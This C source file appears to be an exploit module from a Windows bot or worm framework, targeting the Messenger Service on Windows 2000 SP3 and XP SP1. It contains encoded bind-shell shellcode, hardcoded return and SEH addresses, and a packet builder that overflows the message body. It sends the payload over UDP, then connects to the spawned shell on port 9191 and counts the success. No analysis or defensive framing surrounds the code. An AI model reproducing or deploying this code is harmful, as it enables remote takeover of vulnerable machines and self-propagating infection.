#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MESSENGER

unsigned char kyrgyz_bind_code[] = {
                                       0xEB,0x03,0x5D,0xEB,0x05,0xE8,0xF8,0xFF,0xFF,0xFF,0x8B,0xC5,0x83,0xC0,0x11,0x33,0xC9,0x66,0xB9,
                                       0xC9,0x01,0x80,0x30,0x88,0x40,0xE2,0xFA,
                                       0xDD, 0x03, 0x64, 0x03, 0x7C, 0x09, 0x64, 0x08, 0x88, 0x88, 0x88, 0x60,
                                       0xC4, 0x89, 0x88, 0x88,
                                       0x01, 0xCE, 0x74, 0x77, 0xFE, 0x74, 0xE0, 0x06, 0xC6, 0x86, 0x64, 0x60,
                                       0xD9, 0x89, 0x88, 0x88,
                                       0x01, 0xCE, 0x4E, 0xE0, 0xBB, 0xBA, 0x88, 0x88, 0xE0, 0xFF, 0xFB, 0xBA,
                                       0xD7, 0xDC, 0x77, 0xDE,
                                       0x4E, 0x01, 0xCE, 0x70, 0x77, 0xFE, 0x74, 0xE0, 0x25, 0x51, 0x8D, 0x46,
                                       0x60, 0xB8, 0x89, 0x88,
                                       0x88, 0x01, 0xCE, 0x5A, 0x77, 0xFE, 0x74, 0xE0, 0xFA, 0x76, 0x3B, 0x9E,
                                       0x60, 0xA8, 0x89, 0x88,
                                       0x88, 0x01, 0xCE, 0x46, 0x77, 0xFE, 0x74, 0xE0, 0x67, 0x46, 0x68, 0xE8,
                                       0x60, 0x98, 0x89, 0x88,
                                       0x88, 0x01, 0xCE, 0x42, 0x77, 0xFE, 0x70, 0xE0, 0x43, 0x65, 0x74, 0xB3,
                                       0x60, 0x88, 0x89, 0x88,
                                       0x88, 0x01, 0xCE, 0x7C, 0x77, 0xFE, 0x70, 0xE0, 0x51, 0x81, 0x7D, 0x25,
                                       0x60, 0x78, 0x88, 0x88,
                                       0x88, 0x01, 0xCE, 0x78, 0x77, 0xFE, 0x70, 0xE0, 0x2C, 0x92, 0xF8, 0x4F,
                                       0x60, 0x68, 0x88, 0x88,
                                       0x88, 0x01, 0xCE, 0x64, 0x77, 0xFE, 0x70, 0xE0, 0x2C, 0x25, 0xA6, 0x61,
                                       0x60, 0x58, 0x88, 0x88,
                                       0x88, 0x01, 0xCE, 0x60, 0x77, 0xFE, 0x70, 0xE0, 0x6D, 0xC1, 0x0E, 0xC1,
                                       0x60, 0x48, 0x88, 0x88,
                                       0x88, 0x01, 0xCE, 0x6A, 0x77, 0xFE, 0x70, 0xE0, 0x6F, 0xF1, 0x4E, 0xF1,
                                       0x60, 0x38, 0x88, 0x88,
                                       0x88, 0x01, 0xCE, 0x5E, 0xBB, 0x77, 0x09, 0x64, 0x7C, 0x89, 0x88, 0x88,
                                       0xDC, 0xE0, 0x89, 0x89,
                                       0x88, 0x88, 0x77, 0xDE, 0x7C, 0xD8, 0xD8, 0xD8, 0xD8, 0xC8, 0xD8, 0xC8,
                                       0xD8, 0x77, 0xDE, 0x78,
                                       0x03, 0x50, 0xDF, 0xDF, 0xE0, 0x8A, 0x88, 0xAB, 0x6F, 0x03, 0x44, 0xE2,
                                       0x9E, 0xD9, 0xDB, 0x77,
                                       0xDE, 0x64, 0xDF, 0xDB, 0x77, 0xDE, 0x60, 0xBB, 0x77, 0xDF, 0xD9, 0xDB,
                                       0x77, 0xDE, 0x6A, 0x03,
                                       0x58, 0x01, 0xCE, 0x36, 0xE0, 0xEB, 0xE5, 0xEC, 0x88, 0x01, 0xEE, 0x4A,
                                       0x0B, 0x4C, 0x24, 0x05,
                                       0xB4, 0xAC, 0xBB, 0x48, 0xBB, 0x41, 0x08, 0x49, 0x9D, 0x23, 0x6A, 0x75,
                                       0x4E, 0xCC, 0xAC, 0x98,
                                       0xCC, 0x76, 0xCC, 0xAC, 0xB5, 0x01, 0xDC, 0xAC, 0xC0, 0x01, 0xDC, 0xAC,
                                       0xC4, 0x01, 0xDC, 0xAC,
                                       0xD8, 0x05, 0xCC, 0xAC, 0x98, 0xDC, 0xD8, 0xD9, 0xD9, 0xD9, 0xC9, 0xD9,
                                       0xC1, 0xD9, 0xD9, 0x77,
                                       0xFE, 0x4A, 0xD9, 0x77, 0xDE, 0x46, 0x03, 0x44, 0xE2, 0x77, 0x77, 0xB9,
                                       0x77, 0xDE, 0x5A, 0x03,
                                       0x40, 0x77, 0xFE, 0x36, 0x77, 0xDE, 0x5E, 0x63, 0x16, 0x77, 0xDE, 0x9C,
                                       0xDE, 0xEC, 0x29, 0xB8,
                                       0x88, 0x88, 0x88, 0x03, 0xC8, 0x84, 0x03, 0xF8, 0x94, 0x25, 0x03, 0xC8,
                                       0x80, 0xD6, 0x4A, 0x8C,
                                       0x88, 0xDB, 0xDD, 0xDE, 0xDF, 0x03, 0xE4, 0xAC, 0x90, 0x03, 0xCD, 0xB4,
                                       0x03, 0xDC, 0x8D, 0xF0,
                                       0x8B, 0x5D, 0x03, 0xC2, 0x90, 0x03, 0xD2, 0xA8, 0x8B, 0x55, 0x6B, 0xBA,
                                       0xC1, 0x03, 0xBC, 0x03,
                                       0x8B, 0x7D, 0xBB, 0x77, 0x74, 0xBB, 0x48, 0x24, 0xB2, 0x4C, 0xFC, 0x8F,
                                       0x49, 0x47, 0x85, 0x8B,
                                       0x70, 0x63, 0x7A, 0xB3, 0xF4, 0xAC, 0x9C, 0xFD, 0x69, 0x03, 0xD2, 0xAC,
                                       0x8B, 0x55, 0xEE, 0x03,
                                       0x84, 0xC3, 0x03, 0xD2, 0x94, 0x8B, 0x55, 0x03, 0x8C, 0x03, 0x8B, 0x4D,
                                       0x63, 0x8A, 0xBB, 0x48,
                                       0x03, 0x5D, 0xD7, 0xD6, 0xD5, 0xD3, 0x4A, 0x8C, 0x88
                                   };


int PreparePacket(char *packet,int sizeofpacket, DWORD Jmp, DWORD SEH);


BOOL MessengerService(EXINFO exinfo)
{
    int sockUDP,ver,packetsz;
    unsigned char packet[8192];
    struct sockaddr_in targetUDP;

    struct
    {
        char os[30];
        DWORD SEH;
        DWORD JMP;
    } targetOS[] =
        {
            {
                "Windows 2000 SP 3 (en)",
                0x77ee044c, // unhandledexceptionfilter pointer
                0x768d693e // cryptsvc.dll call [esi+48] 0x768d693e
            },
            {
                "Windows XP SP 1 (en)",
                0x77ed73b4,
                0x7804bf52 //rpcrt4.dll call [edi+6c]
            }
        };

    int TargetOS = FpHost(exinfo.ip, FP_RPC);
    if ((TargetOS == OS_WINNT) || (TargetOS == OS_UNKNOWN)) return FALSE;
    if (TargetOS == OS_WIN2K) ver = 0;
    if (TargetOS == OS_WINXP) ver = 1;
    ZeroMemory(&targetUDP, sizeof(targetUDP));

    targetUDP.sin_family = AF_INET;
    targetUDP.sin_addr.s_addr = finet_addr(exinfo.ip);
    targetUDP.sin_port = fhtons(exinfo.port);


    packetsz = PreparePacket((char*)packet,sizeof(packet),targetOS[ver].JMP,targetOS[ver].SEH);


    if ((sockUDP = fsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
        return FALSE;
    }

    if (fsendto(sockUDP, (char*)packet, packetsz, 0, (struct sockaddr *)&targetUDP, sizeof(targetUDP)) == -1)
    {
        return FALSE;
    }
    fclosesocket(sockUDP);
	Sleep(500);
    if (ConnectShellEx(exinfo, 9191) == true) {
        exploit[exinfo.exploit].stats++;
        return TRUE;
    }
    return FALSE;
}

int PreparePacket(char *packet,int sizeofpacket, DWORD Jmp, DWORD SEH)
{
    static unsigned char packet_header[] =
        "\x04\x00\x28\x00"
        "\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\xf8\x91\x7b\x5a\x00\xff\xd0\x11\xa9\xb2\x00\xc0"
        "\x4f\xb6\xe6\xfc\xff\xff\xff\xff\x42\x69\x73\x68\x6b\x65\x6b\x32"
        "\x30\x30\x33\xff\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00";


    unsigned char field_header[] = "\xff\xff\xff\xff\x00\x00\x00\x00"
                                   "\xff\xff\xff\xff";


    int packet_size,i,fields_size;
    char from[] = "NETMANIAC";
    char machine[] = "ADIK";
    char longjmp[] ="\x90\x90\x90\x90\x90"
                    "\xEB\x03\x58\xEB\x05\xE8\xF8\xFF\xFF\xFF"
                    "\xB9\xFF\xFF\xFF\xFF\x81\xE9\x7F\xEE\xFF"
                    "\xFF\x2B\xC1\xFF\xE0";
    char shortjmp[] ="\x90\x90\x90\x90\xEB\x10\x90\x90\x90\x90\x90\x90";
    char body[5000] = "*** MESSAGE ***";//4096


    ZeroMemory(packet, sizeofpacket);
    packet_size = 0;


    memcpy(&packet[packet_size], packet_header, sizeof(packet_header) - 1);
    packet_size += sizeof(packet_header) - 1;


    i = strlen(from) + 1;
    *(unsigned int *)(&field_header[0]) = i;
    *(unsigned int *)(&field_header[8]) = i;
    memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);
    packet_size += sizeof(field_header) - 1;
    strcpy(&packet[packet_size], from);
    packet_size += (((i - 1) >> 2) + 1) << 2;
    i = strlen(machine) + 1;
    *(unsigned int *)(&field_header[0]) = i;
    *(unsigned int *)(&field_header[8]) = i;
    memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);
    packet_size += sizeof(field_header) - 1;
    strcpy(&packet[packet_size], machine);
    packet_size += (((i - 1) >> 2) + 1) << 2;
    memset(body, 0x90, 2296);
    memcpy(&body[500],kyrgyz_bind_code,sizeof(kyrgyz_bind_code));
    memset(&body[2296],0x14,1800);
    memcpy(&body[2296+1110],shortjmp,sizeof(shortjmp));
    *(DWORD *)&body[2296+1121] = Jmp;
    *(DWORD *)&body[2296+1125] = SEH;
    memcpy(&body[2296+1129],longjmp,sizeof(longjmp)-1);
    fprintf(stdout, "[*] Msg body size: %d\n",
            3656 - packet_size + sizeof(packet_header) - sizeof(field_header));

    body[3656 - packet_size + sizeof(packet_header) - sizeof(field_header) - 1] = '\0';

    i = strlen(body) + 1;

    *(unsigned int *)(&field_header[0]) = i;
    *(unsigned int *)(&field_header[8]) = i;
    memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);
    packet_size += sizeof(field_header) - 1;
    strcpy(&packet[packet_size], body);
    packet_size += i;

    fields_size = packet_size - (sizeof(packet_header) - 1);
    *(unsigned int *)(&packet[40]) = time(NULL);
    *(unsigned int *)(&packet[74]) = fields_size;

    return packet_size;
}
#endif
